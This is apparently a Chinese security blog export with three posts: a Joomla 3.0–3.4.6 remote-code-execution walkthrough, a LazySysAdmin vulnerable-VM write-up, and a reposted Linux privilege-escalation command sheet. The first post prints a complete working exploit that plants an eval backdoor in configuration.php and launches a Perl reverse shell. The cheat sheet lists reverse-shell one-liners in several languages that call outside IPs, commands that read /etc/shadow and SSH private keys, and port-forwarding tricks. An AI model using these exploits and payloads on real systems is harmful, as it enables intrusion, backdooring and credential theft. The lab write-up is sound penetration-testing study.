本文只对拿到shell的过程做一个记录，就不审计分析了 JoomlaJoomla是一套全球有名的CMS系统，之前玩vulnhub的靶机也有碰见过 本次的漏洞影响的版本范围：3.0.0 至 3.4.6 版本 环境下载地址 https://downloads.joomla.org/it/cms/joomla3/3-4-6 安装完之后访问，会跳转到安装界面，按照步骤安装就可以了 漏洞复现漏洞位置 http://192.168.199.228/Joomla_3.4.6-Stable-Full_Package/configuration.php 漏洞验证 网站搭建完毕后，执行如下命令 python Joomla_RCE_EXP.py -t http://127.0.0.1/Joomla_3.4.6-Stable-Full_Package/ 只要显示Vulnerable证明漏洞存在 漏洞利用 python Joomla_RCE_EXP.py -t http://127.0.0.1/Joomla_3.4.6-Stable-Full_Package/ --exploit -l 192.168.199.133 -p 3737 执行成功之后，会在configruation.php中写入一句话，其中密码是随机的 连接测试 这里用蚁剑做连接的测试。从结果可以看到，是连接成功了的 EXP # Exploit Title: Joomla 3.4.6 - &#39;configuration.php&#39; Remote Code Execution # Google Dork: N/A # Date: 2019-10-02 # Exploit Author: Alessandro Groppo @Hacktive Security # Vendor Homepage: https//www.joomla.it/ # Software Link: https://downloads.joomla.org/it/cms/joomla3/3-4-6 # Version: 3.0.0 --&gt; 3.4.6 # Tested on: Linux # CVE : N/A # # Technical details: https://blog.hacktivesecurity.com/index.php?controller=post&amp;action=view&amp;id_post=41 # Github: https://github.com/kiks7/rusty_joomla_rce # # The exploitation is implanting a backdoor in /configuration.php file in the root directory # with an eval in order to be more suitable for all environments, but it is also more intrusive. # If you don&#39;t like this way, you can replace the get_backdoor_pay() # with get_pay(&#39;php_function&#39;, &#39;parameter&#39;) like get_pay(&#39;system&#39;,&#39;rm -rf /&#39;) #!/usr/bin/env python3 import requests from bs4 import BeautifulSoup import sys import string import random import argparse from termcolor import colored PROXS = {&#39;http&#39;:&#39;127.0.0.1:8080&#39;} PROXS = {} def random_string(stringLength): letters = string.ascii_lowercase return &#39;&#39;.join(random.choice(letters) for i in range(stringLength)) backdoor_param = random_string(50) def print_info(str): print(colored(&quot;[*] &quot; + str,&quot;cyan&quot;)) def print_ok(str): print(colored(&quot;[+] &quot;+ str,&quot;green&quot;)) def print_error(str): print(colored(&quot;[-] &quot;+ str,&quot;red&quot;)) def print_warning(str): print(colored(&quot;[!!] &quot; + str,&quot;yellow&quot;)) def get_token(url, cook): token = &#39;&#39; resp = requests.get(url, cookies=cook, proxies = PROXS) html = BeautifulSoup(resp.text,&#39;html.parser&#39;) # csrf token is the last input for v in html.find_all(&#39;input&#39;): csrf = v csrf = csrf.get(&#39;name&#39;) return csrf def get_error(url, cook): resp = requests.get(url, cookies = cook, proxies = PROXS) if &#39;Failed to decode session object&#39; in resp.text: #print(resp.text) return False #print(resp.text) return True def get_cook(url): resp = requests.get(url, proxies=PROXS) #print(resp.cookies) return resp.cookies def gen_pay(function, command): # Generate the payload for call_user_func(&#39;FUNCTION&#39;,&#39;COMMAND&#39;) template = &#39;s:11:&quot;maonnalezzo&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\\\0\\\\0\\\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\\\0\\\\0\\\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:FUNC_LEN:&quot;FUNC_NAME&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:LENGTH:&quot;PAYLOAD&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\\\0\\\\0\\\\0connection&quot;;i:1;}&#39; #payload = command + &#39; || $a=\\&#39;http://wtf\\&#39;;&#39; payload = &#39;http://l4m3rz.l337/;&#39; + command # Following payload will append an eval() at the enabled of the configuration file #payload = &#39;file_put_contents(\\&#39;configuration.php\\&#39;,\\&#39;if(isset($_POST[\\\\\\&#39;test\\\\\\&#39;])) eval($_POST[\\\\\\&#39;test\\\\\\&#39;]);\\&#39;, FILE_APPEND) || $a=\\&#39;http://wtf\\&#39;;&#39; function_len = len(function) final = template.replace(&#39;PAYLOAD&#39;,payload).replace(&#39;LENGTH&#39;, str(len(payload))).replace(&#39;FUNC_NAME&#39;, function).replace(&#39;FUNC_LEN&#39;, str(len(function))) return final def make_req(url , object_payload): # just make a req with object print_info(&#39;Getting Session Cookie ..&#39;) cook = get_cook(url) print_info(&#39;Getting CSRF Token ..&#39;) csrf = get_token( url, cook) user_payload = &#39;\\\\0\\\\0\\\\0&#39; * 9 padding = &#39;AAA&#39; # It will land at this padding working_test_obj = &#39;s:1:&quot;A&quot;:O:18:&quot;PHPObjectInjection&quot;:1:{s:6:&quot;inject&quot;;s:10:&quot;phpinfo();&quot;;}&#39; clean_object = &#39;A&quot;;s:5:&quot;field&quot;;s:10:&quot;AAAAABBBBB&#39; # working good without bad effects inj_object = &#39;&quot;;&#39; inj_object += object_payload inj_object += &#39;s:6:&quot;return&quot;;s:102:&#39; # end the object with the &#39;return&#39; part password_payload = padding + inj_object params = { &#39;username&#39;: user_payload, &#39;password&#39;: password_payload, &#39;option&#39;:&#39;com_users&#39;, &#39;task&#39;:&#39;user.login&#39;, csrf :&#39;1&#39; } print_info(&#39;Sending request ..&#39;) resp = requests.post(url, proxies = PROXS, cookies = cook,data=params) return resp.text def get_backdoor_pay(): # This payload will backdoor the the configuration .PHP with an eval on POST request function = &#39;assert&#39; template = &#39;s:11:&quot;maonnalezzo&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\\\0\\\\0\\\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\\\0\\\\0\\\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:FUNC_LEN:&quot;FUNC_NAME&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:LENGTH:&quot;PAYLOAD&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\\\0\\\\0\\\\0connection&quot;;i:1;}&#39; # payload = command + &#39; || $a=\\&#39;http://wtf\\&#39;;&#39; # Following payload will append an eval() at the enabled of the configuration file payload = &#39;file_put_contents(\\&#39;configuration.php\\&#39;,\\&#39;if(isset($_POST[\\\\\\&#39;&#39; + backdoor_param +&#39;\\\\\\&#39;])) eval($_POST[\\\\\\&#39;&#39;+backdoor_param+&#39;\\\\\\&#39;]);\\&#39;, FILE_APPEND) || $a=\\&#39;http://wtf\\&#39;;&#39; function_len = len(function) final = template.replace(&#39;PAYLOAD&#39;,payload).replace(&#39;LENGTH&#39;, str(len(payload))).replace(&#39;FUNC_NAME&#39;, function).replace(&#39;FUNC_LEN&#39;, str(len(function))) return final def check(url): check_string = random_string(20) target_url = url + &#39;index.php/component/users&#39; html = make_req(url, gen_pay(&#39;print_r&#39;,check_string)) if check_string in html: return True else: return False def ping_backdoor(url,param_name): res = requests.post(url + &#39;/configuration.php&#39;, data={param_name:&#39;echo \\&#39;PWNED\\&#39;;&#39;}, proxies = PROXS) if &#39;PWNED&#39; in res.text: return True return False def execute_backdoor(url, payload_code): # Execute PHP code from the backdoor res = requests.post(url + &#39;/configuration.php&#39;, data={backdoor_param:payload_code}, proxies = PROXS) print(res.text) def exploit(url, lhost, lport): # Exploit the target # Default exploitation will append en eval function at the end of the configuration.pphp # as a bacdoor. btq if you do not want this use the funcction get_pay(&#39;php_function&#39;,&#39;parameters&#39;) # e.g. get_payload(&#39;system&#39;,&#39;rm -rf /&#39;) # First check that the backdoor has not been already implanted target_url = url + &#39;index.php/component/users&#39; make_req(target_url, get_backdoor_pay()) if ping_backdoor(url, backdoor_param): print_ok(&#39;Backdoor implanted, eval your code at &#39; + url + &#39;/configuration.php in a POST with &#39; + backdoor_param) print_info(&#39;Now it\\&#39;s time to reverse, trying with a system + perl&#39;) execute_backdoor(url, &#39;system(\\&#39;perl -e \\\\\\&#39;use Socket;$i=&quot;&#39;+ lhost +&#39;&quot;;$p=&#39;+ str(lport) +&#39;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};\\\\\\&#39;\\&#39;);&#39;) if __name__ == &#39;__main__&#39;: parser = argparse.ArgumentParser() parser.add_argument(&#39;-t&#39;,&#39;--target&#39;,required=True,help=&#39;Joomla Target&#39;) parser.add_argument(&#39;-c&#39;,&#39;--check&#39;, default=False, action=&#39;store_true&#39;, required=False,help=&#39;Check only&#39;) parser.add_argument(&#39;-e&#39;,&#39;--exploit&#39;,default=False,action=&#39;store_true&#39;,help=&#39;Check and exploit&#39;) parser.add_argument(&#39;-l&#39;,&#39;--lhost&#39;, required=&#39;--exploit&#39; in sys.argv, help=&#39;Listener IP&#39;) parser.add_argument(&#39;-p&#39;,&#39;--lport&#39;, required=&#39;--exploit&#39; in sys.argv, help=&#39;Listener port&#39;) args = vars(parser.parse_args()) url = args[&#39;target&#39;] if(check(url)): print_ok(&#39;Vulnerable&#39;) if args[&#39;exploit&#39;]: exploit(url, args[&#39;lhost&#39;], args[&#39;lport&#39;]) else: print_info(&#39;Use --exploit to exploit it&#39;) else: print_error(&#39;Seems NOT Vulnerable ;/&#39;) 漏洞预防 ①部署安全狗对于网站目录文件的查杀 ②更新至最新版本3.9.12 Reference https://mp.weixin.qq.com/s/jqKdJDoFuZeY70nnqY7RNw https://mp.weixin.qq.com/s?__biz=MzI2NTg4OTc5Nw==&amp;mid=2247491044&amp;idx=1&amp;sn=4661e1e02f9606f86c1f8d17a5d499b9&amp;chksm=ea972c8edde0a598c5cd624909a7071a974de82850c1cf52db9bb6d2d611aebddb64735c8144&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1570606205325&amp;sharer_shareid=9acc96b64dfbde0e292e6ebcb72488d2#rd","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://knlvre.github.io/tags/渗透测试/"}],"author":"Knlvre"},{"title":"LazySysAdmin靶机渗透测试","slug":"LazySysAdmin靶机渗透测试","date":"2019-10-07T16:00:00.000Z","updated":"2019-10-19T12:40:23.814Z","comments":true,"path":"2019/10/08/LazySysAdmin靶机渗透测试/","link":"","permalink":"https://knlvre.github.io/2019/10/08/LazySysAdmin靶机渗透测试/","excerpt":"","text":"LazySysAdmin环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.199.133） 靶机：LazySysAdmin（IP：192.168.199.136） 渗透测试Netdiscover扫描网段，发现靶机IP地址 netdiscover -r 192.168.199.0/24 Currently scanning: Finished! | Screen View: Unique Hosts 10 Captured ARP Req/Rep packets, from 7 hosts. Total size: 600 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.168.199.1 d4:ee:07:3c:d0:6c 4 240 HIWIFI Co., Ltd. 192.168.199.136 00:0c:29:a6:c9:06 1 60 VMware, Inc. ... nmap扫描 root@Knlvre:~# nmap -A 192.168.199.136 Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-08 20:48 CST Nmap scan report for LazySysAdmin.lan (192.168.199.136) Host is up (0.00085s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA) | 2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA) | 256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA) |_ 256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-generator: Silex v2.2.7 | http-robots.txt: 4 disallowed entries |_/old/ /test/ /TR2/ /Backnode_files/ |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Backnode 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP) 3306/tcp open mysql MySQL (unauthorized) 6667/tcp open irc InspIRCd | irc-info: | server: Admin.local | users: 1 | servers: 1 | chans: 0 | lusers: 1 | lservers: 0 | source ident: nmap | source host: 192.168.199.133 |_ error: Closing link: (nmap@192.168.199.133) [Client exited] 从扫描结果可以看到，除了常见的ssh和web端口外，还有Samba、Mysql、InspIRCd，这里介绍一下 InspIRCd，是一个UNIX系统和Windows系统的聊天服务器 Samba，是种用来让UNIX系列的操作系统与微软Windows操作系统的SMB/CIFS（Server Message Block/Common Internet File System）网络协议做链接的自由软件。第三版不仅可访问及分享SMB的文件夹及打印机，本身还可以集成入Windows Server的网域，扮演为网域控制站（Domain Controller）以及加入Active Directory成员。简而言之，此软件在Windows与UNIX系列操作系统之间搭起一座桥梁，让两者的资源可互通有无 当然了，既然80端口开放，先浏览器访问，一个普通的界面并且没有可以利用的信息 貌似没有可利用信息，用kali自带的DirBuster扫一下目录。使用如下命令打开 dirbuster -u http://192.168.199.136 可以看到Target URL已经帮我们填好，因为在命令行输入了。现在点击Browse，添加扫描目录使用的字典，添加字典/usr/share/dirbuster/wordlists/directory-list-1.0.txt，然后点击Start开始扫描 不一会就扫描出了wordpress和phpmyadmin目录 Ps：突然想用其他工具扫描一下目录： ①dirsearch：扫描结果还算完整，但是缺少wordpress文件夹 ②AWVS11：单单扫描目录结果并不完整，选择full scan可以扫出一部分目录，但是等全部完成又需要较长时间，我没有等下去，对于本靶机只扫目录的话，比较慢 ③长亭Xray：不知道是不是我姿势不对，扫描得并不完整 xray_windows_amd64.exe webscan --basic-crawler http://192.168.199.136 --html-output 2.html 回归正题，接下来访问phpmyadmin 用test404大佬写的工具爆破没有结果 转头去访问wordpress目录，是可以访问的，wpscan扫描一下。但是只扫出一个admin用户，无利用点 root@Knlvre:~# wpscan --url http://192.168.199.136/wordpress/ --enumerate u ... [+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00 &lt;========&gt; (10 / 10) 100.00% Time: 00:00:00 [i] User(s) Identified: [+] View all posts by Admin | Detected By: Author Posts - Display Name (Passive Detection) [+] Admin | Detected By: Rss Generator (Passive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] admin | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] Finished: Wed Oct 9 10:57:41 2019 InsplRCd 参考文章：IRC 用工具irssi连接靶机的InsplRCd服务。先下载irssi sudo apt-get install irssi 然后启动irssi客户端 irssi 然后输入如下命令连接，连接成功，但是没有可利用信息，放弃 /connect 192.168.199.136 Sanba 简单介绍一款工具：enum4linux enum4linux：可以枚举Windows和Samba主机中的数据 先试用enum4linux枚举运行samba的主机信息，扫描后发现存在共享目录和允许空口令 root@Knlvre:~# enum4linux 192.168.199.136 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Oct 9 16:54:50 2019 ========================== | Target Information | ========================== ... ======================================== | Session Check on 192.168.199.136 | ======================================== [+] Server 192.168.199.136 allows sessions using username &#39;&#39;, password &#39;&#39; ... ============================================ | Share Enumeration on 192.168.199.136 | ============================================ Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers share$ Disk Sumshare IPC$ IPC IPC Service (Web server) Reconnecting with SMB1 for workgroup listing. 现在可以进行远程挂载，尝试连接 点击connect后进入，发现了两个共享文件夹：print和share 双击share文件夹，以Anonymous进入 直接发现是网站的源代码 查看其他文件没有可用信息，但是当看到deets.txt时，发现了password字样 root@Knlvre:/run/user/0/gvfs/smb-share:server=192.168.199.136,share=share$# cat deets.txt CBF Remembering all these passwords. Remember to remove this file and update your password after we push out the server. Password 12345 想到刚才wpscan扫出来的admin，用这个密码去wordpress的后台登录界面登录试一下。登陆失败，后来又想到主界面一直重复出现的提示My name is togie.，用togie用户名去登录，也是失败 http://192.168.199.136/wordpress/wp-login.php 又想到开放22端口，继续去尝试一下。用用户名：togie，密码：12345登录成功 root@Knlvre:~# ssh togie@192.168.199.136 ################################################################################################## # Welcome to Web_TR1 # # All connections are monitored and recorded # # Disconnect IMMEDIATELY if you are not an authorized user! # ################################################################################################## togie@192.168.199.136&#39;s password: Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686) ... togie@LazySysAdmin:~$ whoami togie togie@LazySysAdmin:~$ 发现该用户属于sudo组 togie@LazySysAdmin:~$ id uid=1000(togie) gid=1000(togie) groups=1000(togie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare) 现在尝试命令sudo su，直接提权成功 togie@LazySysAdmin:~$ sudo su [sudo] password for togie: root@LazySysAdmin:/home/togie# id uid=0(root) gid=0(root) groups=0(root) 然后现在用root用户查看/etc/sudoers文件，果然是默认地赋予了sudu组权限，才能提权 root@LazySysAdmin:/home/togie# cat /etc/sudoers ... # User privilege specification root ALL=(ALL:ALL) ALL # Members of the admin group may gain root privileges %admin ALL=(ALL) ALL # Allow members of group sudo to execute any command %sudo ALL=(ALL:ALL) ALL #这条关键语句 ... root@LazySysAdmin:/home/togie# 拿下flag root@LazySysAdmin:/home/togie# cd ~ root@LazySysAdmin:~# ls proof.txt root@LazySysAdmin:~# cat proof.txt WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851 Well done :) Hope you learn&#39;t a few things along the way. Regards, Togie Mcdogie Enjoy some random strings WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851 2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7 pf%&amp;1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02 bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu 另一种思路 本靶机还有另外一种解法，就是拿到share$文件后，进入wordpress目录，查看wp-config.php，在该配置文件里会看到数据库的账号和密码（密码那么复杂难怪没有爆破出来） root@Knlvre:/run/user/0/gvfs/smb-share:server=192.168.199.136,share=share$/wordpress# cat wp-config.php ... // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define(&#39;DB_NAME&#39;, &#39;wordpress&#39;); /** MySQL database username */ define(&#39;DB_USER&#39;, &#39;Admin&#39;); /** MySQL database password */ define(&#39;DB_PASSWORD&#39;, &#39;TogieMYSQL12345^^&#39;); /** MySQL hostname */ define(&#39;DB_HOST&#39;, &#39;localhost&#39;); /** Database Charset to use in creating database tables. */ define(&#39;DB_CHARSET&#39;, &#39;utf8&#39;); /** The Database Collate type. Don&#39;t change this if in doubt. */ define(&#39;DB_COLLATE&#39;, &#39;&#39;); ... 拿去phpmyadmin登录，虽然登陆进去但是没有任何权限 于是去wordpress后台登录，也是可以登录进来的。点击Appearance -&gt; Editor -&gt; 404 Template 在开头这里插入php反弹shell的代码 然后开启端口监听，在随便访问一个不存在的文件（目的是为了404.php） 172.31.19.221/wordpress/?p=Knlvre.php 然后就可以拿下shell，后续提权不再去做了 root@Knlvre:~# nc -lvnp 3737 listening on [any] 3737 ... connect to [172.31.19.207] from (UNKNOWN) [172.31.19.221] 59424 Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux 23:54:05 up 36 min, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can&#39;t access tty; job control turned off $ whoami www-data $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ Reference https://xz.aliyun.com/t/2789 https://www.cnblogs.com/yuzly/p/10800861.html","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://knlvre.github.io/tags/渗透测试/"}],"author":"Knlvre"},{"title":"Linux 提权常用命令集","slug":"Linux 提权常用命令集","date":"2019-10-03T16:00:00.000Z","updated":"2019-10-20T08:18:07.673Z","comments":true,"path":"2019/10/04/Linux 提权常用命令集/","link":"","permalink":"https://knlvre.github.io/2019/10/04/Linux 提权常用命令集/","excerpt":"","text":"本文转载自原文：Linux 提权常用命令集 0x00 操作系统相关操作系统类型版本 cat /etc/issue cat /etc/*-release cat /etc/lsb-release # Debian cat /etc/redhat-release # Redhat 内核版本，是否是64位 getconf LONG_BIT cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz- 环境变量 cat /etc/profile cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout env set 查看是否有打印机 lpstat -a 0x01 应用与服务相关查看正在运行的程序及对应的用户权限 ps aux ps -ef top cat /etc/services 以root权限运行的进程 ps aux | grep root ps -ef | grep root 查看安装了的应用 ls -alh /usr/bin/ ls -alh /sbin/ dpkg -l rpm -qa ls -alh /var/cache/apt/archives ls -alh /var/cache/yum/ 一些服务的配置文件 cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk &#39;$1 ~ /^.*r.*/&#39; 计划任务 crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root 找存储的明文用户名，密码 grep -i user [filename] grep -i pass [filename] grep -C 5 &quot;password&quot; [filename] find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla 0x02 通信与网络相关查看当前网络地址 /sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network 查看网络配置,DNS,DHCP,网关 cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname 查看网络通信 lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w 查看缓存 arp -e route /sbin/route -nee tcpdump tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21 tcpdump tcp dst [ip] [port] and tcp dst [ip] [port] 交互式shellbash版本： bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 python版本: python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39; php版本： php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3&gt;&amp;3 2&gt;&amp;3&quot;);&#39; ruby版本： ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d&gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39; nc版本： nc -e /bin/sh 223.8.200.234 1234 nc不使用-e： mknod /tmp/backpipe p /bin/sh 0/tmp/backpipe mknod: mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe java版本： r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/202.103.243.122/2002;cat &lt;&amp;5 2=&quot;&quot; |=&quot;&quot; while=&quot;&quot; read=&quot;&quot; line;=&quot;&quot; do=&quot;&quot; \\$line=&quot;&quot;&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor() lua版本： lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;202.103.243.122&#39;,&#39;1234&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3&gt;&amp;3 2&gt;&amp;3&#39;);&quot; 端口转发 lcx lcx -listen 4567 33891 #Attacker lcx -slave 111.222.333.444 4567 127.0.0.1 3389 # On the targets ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip] ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080) mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080) 隧道 ssh -D 127.0.0.1:9050 -N [username]@[ip] proxychains ifconfig 0x03 用户相关用户信息 id who w last cat /etc/passwd cat /etc/group cat /etc/shadow ls -alh /var/mail/ grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 { print $1}&#39; # 列出超级用户 awk -F: &#39;($3 == &quot;0&quot;) {print}&#39; /etc/passwd #列出超级用户 cat /etc/sudoers sudo -l 列家目录 ls -ahlR /root/ ls -ahlR /home/ 从配置文件里面寻找密码 cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg 看其他用户的操作记录 cat ~/.bash_history cat ~/.nano_history cat ~/.atftp_history cat ~/.mysql_history cat ~/.php_history ssh私钥 cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key 0x04 文件系统相关/etc/目录下面文件 ls -aRl /etc/ | awk &#39;$1 ~ /^.*w.*/&#39; 2&gt;/dev/null # Anyone ls -aRl /etc/ | awk &#39;$1 ~ /^..w/&#39; 2&gt;/dev/null # Owner ls -aRl /etc/ | awk &#39;$1 ~ /^.....w/&#39; 2&gt;/dev/null # Group ls -aRl /etc/ | awk &#39;$1 ~ /w.$/&#39; 2&gt;/dev/null # Other find /etc/ -readable -type f 2&gt;/dev/null # Anyone find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null # Anyone 日志文件 ls -alh /var/log ls -alh /var/mail ls -alh /var/spool ls -alh /var/spool/lpd ls -alh /var/lib/pgsql ls -alh /var/lib/mysql cat /var/lib/dhcp3/dhclient.leases 查看网站文件 ls -alhR /var/www/ ls -alhR /srv/www/htdocs/ ls -alhR /usr/local/www/apache22/data/ ls -alhR /opt/lampp/htdocs/ ls -alhR /var/www/html/ 常见日志文件 cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log ls -alh /var/lib/dhcp3/ ls -alh /var/log/postgresql/ ls -alh /var/log/proftpd/ ls -alh /var/log/samba/ 文件挂载 mount df -h cat /etc/fstab Find命令 find / -perm -1000 -type d 2&gt;/dev/null # 只有目录所有者才可以更改删除 find / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it. find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it. find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUID for i in `locate -r &quot;bin$&quot;`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2&gt;/dev/null; done # 从下面几个位置: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者其他的bin目录寻找 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2&gt;/dev/null 